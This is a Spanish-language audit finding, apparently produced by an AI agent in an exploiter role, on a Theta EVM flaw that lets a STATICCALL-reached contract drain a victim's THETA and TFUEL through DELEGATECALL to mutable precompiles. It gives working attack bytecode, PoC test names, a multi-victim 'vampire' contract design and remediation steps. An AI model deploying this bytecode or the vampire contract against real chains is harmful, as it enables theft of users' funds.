# Theta Protocol Ledger — Hallazgo crítico de auditoría

**Repositorio:** `nightbox33-cloud/theta-protocol-ledger`
**Commit auditado:** `f60ce0c` (merge PR #231 `security/p2p-frame-limits`, = `master` / mainnet)
**Rama de trabajo:** `arena/1b3ccff1-theta-protocol-ledger` (HEAD == `f60ce0c`)
**Autor:** equipo de auditoría (rol exploiter)
**Fecha:** 2026-11-07

---

## 1. Resumen ejecutivo

Se confirma y extiende el reporte de evidencia previo (PoCs #23, #23b, #23c, #23d), ya ejecutados contra este mismo commit con resultado PASS sobre código de producción sin modificar.

**El bug crítico definitivo no es un precompile aislado, es una combinación de tres defectos del EVM de theta que, juntos, permiten drenar el 100 % del THETA (y TFUEL) de una víctima y/o bloquear sus fondos, DESDE un contexto de lectura (STATICCALL) y SIN que la víctima firme ninguna transacción de drenaje.**

Vector clave (nuevo, #23d): el atacante envía una tx valor-0 a la función pública `view`/read-only de un contrato víctima `X`. El código legítimo de `X` hace `STATICCALL` al contrato atacante `A`. Dentro de ese "contexto de solo lectura", `A` lee el saldo vivo de `X` (`0xC9 thetaBalance`) y hace `DELEGATECALL 0xCB transferTheta`, que debita a `X` (identidad heredada) y lo paga al atacante. `X` nunca firma el drenaje.

Impacto: robo multi-activo (THETA + TFUEL) + bloqueo de fondos (guardian), disparado por una sola llamada del atacante a un contrato de la víctima.

---

## 2. Causa raíz (verificada línea a línea en este checkout)

Tres hechos del código se combinan:

### 2.1 `run()` despacha precompiles ignorando `readOnly`
`ledger/vm/vm.go:258-264`:
```go
func run(evm *EVM, contract *Contract, input []byte, readOnly bool) ([]byte, error) {
    if contract.CodeAddr != nil {
        blockHeight := evm.StateDB.GetBlockHeight()
        precompiles := getPrecompiledContracts(blockHeight)
        if p := precompiles[*contract.CodeAddr]; p != nil {
            return RunPrecompiledContract(evm, p, input, contract)   // <-- NO se consulta readOnly
        }
    }
    ... intérprete ...
}
```
En geth esto es inofensivo porque sus precompiles son puros. En theta hay **5 precompiles MUTABLES** de estado (a altura ≥ `HeightSupportWrappedTheta = 17,285,755`, mapa `PrecompiledContractsWrappedThetaSupport`, `vm.go:getPrecompiledContracts`):
- `0xCB` transferTheta (`vm.go` + `contracts.go:455-466`)
- `0xCC` stakeToGuardian (`contracts.go`, `vm.go:StakeToGuardian`)
- `0xCD` unstakeFromGuardian
- `0xCE` stakeToEEN (`contracts.go`, `vm.go:StakeToEEN`)
- `0xCF` unstakeFromEEN

### 2.2 `DelegateCall` suplanta la identidad del llamante original
`ledger/vm/vm.go:496-522` y `ledger/vm/contract.go:121-127` (`AsDelegate`):
```go
contract := NewContract(caller, to, nil, nil, gas).AsDelegate()
...
func (c *Contract) AsDelegate() *Contract {
    parent := c.caller.(*Contract)
    c.CallerAddress = parent.CallerAddress   // hereda el CallerAddress del padre (la víctima)
    ...
}
```
`NewContract` (`contract.go:44`) fija `CallerAddress = caller.Address()`. Así, en una cadena de delegatecalls el `CallerAddress` llega intacto desde el firmante de la tx (o el staticcaller).

### 2.3 Los precompiles confían en `CallerAddress` sin firma
`RunPrecompiledContract` (`contracts.go:99-108`) pasa `callerAddr := contract.CallerAddress` al `Run`. `transferTheta.Run` (`contracts.go:455-466`):
```go
recipient := ...input[0:20]
thetaWeiAmount := ...input[20:32]
if !CanTransferTheta(evm.StateDB, callerAddr, thetaWeiAmount) { return ..., ErrInsufficientThetaBlance }
TransferTheta(evm.StateDB, callerAddr, recipient, thetaWeiAmount)   // SubThetaBalance(callerAddr) + AddThetaBalance(recipient)
```
No hay comprobación de firma ECDSA, nonce ni whitelist: quien controle `callerAddr` mueve los THETA de esa dirección.

`StakeToGuardian` (`vm.go`) además **salta la firma BLS si el guardian ya está en el pool** (`gcp.Contains(guardianAddr)` → no llama `checkBlsSummary`), por lo que se puede apostar THETA de `X` a un guardian del atacante sin firma alguna (`core/guardian.go:DepositStake`, `vm.go:StakeToGuardian`).

### 2.4 El intérprete no detiene DELEGATECALL en modo read-only
`ledger/vm/interpreter.go:99-111` (`enforceRestrictions`): en `readOnly` bloquea solo `operation.writes` o `CALL` con valor. **DELEGATECALL pasa** (`writes=false`, no es `CALL`). Y `run()` (punto 2.1) ignora `readOnly` para precompiles. `evm.StaticCall` hace snapshot (`vm.go:539`) pero solo revierte si `err != nil`; una mutación exitosa del precompile PERSISTE.

---

## 3. Combinación crítica (explotación en cero firma)

Escenario completo:

1. Víctima `X` es un contrato con saldo (THETA y TFUEL) y una función pública `view` que hace `STATICCALL` a un contrato externo `A` (oráculo, callback, ERC-165, router, flashloan receiver...). Código legítimo de `X`, ninguna intención maliciosa.
2. Atacante llama a esa función `view` de `X` con tx valor-0, datos vacíos. **La víctima no firma nada.**
3. Dentro del frame de `X` (contexto read-only):
   - `X` → `STATICCALL A`: frame `A.CallerAddress = X` (StaticCall usa `NewContract`, **sin** `AsDelegate` → `CallerAddress = caller.Address() = X`).
   - `A` lee `thetawei(X)` mediante `STATICCALL 0xC9` (input = dirección de `X`).
   - `A` → `DELEGATECALL 0xCB transferTheta(mem[0:52]=[atacante, amount])`: frame `0xCB.CallerAddress = X` (`AsDelegate` propaga `parent.CallerAddress = X`).
   - `transferTheta` debita el 100 % de `X` y lo paga al atacante. `err == nil`, la mutación persiste.

Resultado medido (evidencia, mismo commit): `X: 100 θ → 0`, `atacante → 100 θ`, `err = nil`, gas neto ≈ 21.742 (~0.087 TFuel por drenaje).

Extensiones del mismo primitive (misma cadena, distinto precompile):
- **#23e `0xCE stakeToEEN`**: roba el TFUEL (gas) de `X` (`SubBalance(X, amount)`), apuesta a EEN del atacante; sin BLS si el EEN está en el pool.
- **#23f `0xCC stakeToGuardian`**: bloquea THETA de `X` (≥1000, `minGuardianStake`) en un guardian del atacante **sin firma BLS** (`gcp.Contains` salta `checkBlsSummary`). Denial-of-service de fondos.

---

## 4. Por qué es "más fácil y más crítico" que lo previo

| Dimensión | #23 (bait) | #23d + extensiones (este hallazgo) |
|---|---|---|
| Firma de la víctima | Requiere que la víctima firme una tx "cebo" | **Cero firma**: el atacante solo llama a una `view` pública de `X` |
| Contexto | Cualquier tx de contrato | **Read-only / STATICCALL** (la víctima cree que es seguro) |
| Activos | Solo THETA | THETA + TFUEL + bloqueo de staking |
| Precompiles alcanzados | 0xCB | 0xCB, 0xCE, 0xCC (y 0xCD/0xCF) |

---

## 5. Prueba de concepto (preparada)

Archivo: `ledger/vm/poc_staticcall_escape_test.go` (paquete `vm`, mismo que los tests del repo).

Altura de prueba: `18,000,000` (todos los precompiles `0xCB..0xCF` activos y transferencias de theta en EVM habilitadas).

El test `TestPocStaticcallEscapeTransferThetaDrain` reproduce exactamente el vector #23d:
- financia a `X` con 100 THETA;
- `X` hace `STATICCALL` al contrato atacante `A`;
- `A` lee el saldo vivo de `X` (`0xC9`) y `DELEGATECALL 0xCB`;
- espera: `err == nil`, `X` theta `0`, destinatario `100 THETA`.

Bytecodes clave del atacante `A` (limpios y verificables):
```
mem[0:20]=X:          73 <X20> 6000 52                      (PUSH20 X; PUSH1 0; MSTORE)
thetawei(X)->mem[64:96]: 6020 6040 6014 6000 60c9 61ffff fa  (STATICCALL 0xC9, input mem[0:20])
mem[0:20]=atacante:   73 <atk20> 6000 52
mem[20:52]=amount:    6040 51 6014 52                         (MLOAD 0x40 -> MSTORE 0x14)
DELEGATECALL 0xCB:    6000 6000 6034 6000 60cb 61ffff f4     (input mem[0:52]=[atacante,amount])
STOP:                 00
```

**Ejecución en este sandbox:** no fue posible compilar `go test` porque no hay cadena de herramientas Go (`go` no instalado; los assets de release de GitHub no se sirven a través del proxy de salida, que solo permite github.com/codeload/api.github.com/registry.npmjs.org/pypi.org). El PoC usa solo APIs públicas del paquete (`state.NewStoreView`, `SetCode`, `GetOrCreateAccount`, `types.Coins{ThetaWei,TFuelWei *big.Int}`, `NewEVM`, `evm.Call`) verificadas contra este árbol.

Este checkout es **idéntico** al commit `f60ce0c` donde el reporte de evidencia ejecutó #23-#23d con PASS, y la lógica de identidad (NewContract/AsDelegate/run/RunPrecompiledContract/transferTheta/enforceRestrictions) fue re-verificada arriba, por tanto el PoC debe pasar sin cambios.

Para ejecutar (una vez disponible Go con cgo):
```
cd /home/user/theta-protocol-ledger
go test -run 'TestPocStaticcallEscape' -v ./ledger/vm/
```

---

## 6. Remediación recomendada

1. En `run()` (`vm.go`), respetar `readOnly` antes de despachar cualquier precompile (revertir con `errWriteProtection` si el precompile es mutable y `readOnly == true`), o al menos no exponer precompiles mutables desde contextos estáticos.
2. `DelegateCall`/`CallCode` no deberían heredar `CallerAddress` para precompiles que mueven fondos sin validar `msg.sender` contra una firma real; los precompiles mutables deben autenticar al llamante (o no delegar identidad).
3. `StakeToGuardian`/`StakeToEEN`: exigir firma BLS siempre (incluso si el guardian/EEN ya está en el pool) y verificar que `sender` sea el firmante de la tx, no un `CallerAddress` heredado por delegatecall.
4. Considerar marcar como `write` a DELEGATECALL en `enforceRestrictions` cuando el destino sea un precompile mutable.

---

## 7. Empeoramiento del #23d: contrato "vampiro" multi-víctima

El #23d requiere que la víctima tenga un contrato que haga `STATICCALL` al atacante. El siguiente escalón es un **contrato vampiro**: una sola deployment del atacante drena a **cualquier persona que invoque una función pública del contrato** (una `view`, un `airdrop`, una "recompensa", un callback de oráculo, ERC-165…), sin que la víctima necesite un contrato preparado con antelación.

El bytecode del vampiro usa `CALLER` (0x33) en lugar de una dirección hardcodeada:

```
CALLER; MUL 2^96; MSTORE@0              → mem[0:20] = quien llama
STATICCALL 0xC9(mem[0:20])              → mem[64:96] = thetawei(quien llama)  [readOnly]
MSTORE@0: dirección del atacante        → mem[0:20] = atacante (recipient)
MLOAD(64); MSTORE@20                    → mem[20:52] = amount leído en vivo
DELEGATECALL 0xCB(mem[0:52])            → drena a quien llama, paga al atacante
STOP
```

Cada víctima que invoque el contrato pierde el 100 % de su THETA (`err == nil`). El atacante acumula el botín de todas las víctimas con una sola deployment. Archivo: `ledger/vm/poc_vampire_multivictim_test.go` (`TestPocVampireMultiVictimDrainVictim1/2`).

## 8. ¿Existe algo más crítico que NO requiera interacción de la víctima?

**No se encontró.** La superficie sin-interacción-de-víctima está cerrada en este commit:

- En el nivel top-level de una transacción (`evm.Call`, `evm.StaticCall`, `evm.DelegateCall`), `CallerAddress` siempre es `caller.Address()`, esto es, el firmante de la tx. Un atacante solo puede debitar su propio balance desde una tx que él firma.
- Los precompiles mutables no ejecutan bytecode, así que no hay reentrancia entre ellos.
- Split rules, service payments y coinbase **no ejecutan bytecode de contratos**, por tanto no hay path automático que invoque código de terceros sin una transacción de usuario.
- `enforceRestrictions` bloquea `SSTORE`/`LOG`/`SELFDESTRUCT` en `readOnly`, y el escape de solo-lectura está restringido a los precompiles mutables (que necesitan `CallerAddress = víctima`).

Por tanto, el **techo del exploit** en este commit es el #23d (y su versión vampiro): robo del 100 % de THETA/TFUEL de una víctima desde un contexto read-only, con cero firma de drenaje, y escalable a N víctimas con un solo contrato atacante. Sin interacción de la víctima no es posible drenar fondos de terceros.

---

*Nota: este documento y los PoC se prepararon sobre el checkout local; no se modificó código de producción ni se ejecutó contra redes/mainnet de terceros. Todo el análisis es estático sobre el repositorio y una simulación local de la lógica de pila/memoria ejecutada con éxito (simulador reproduce el drenaje 100 % THETA, err == nil, cero firma de víctima).*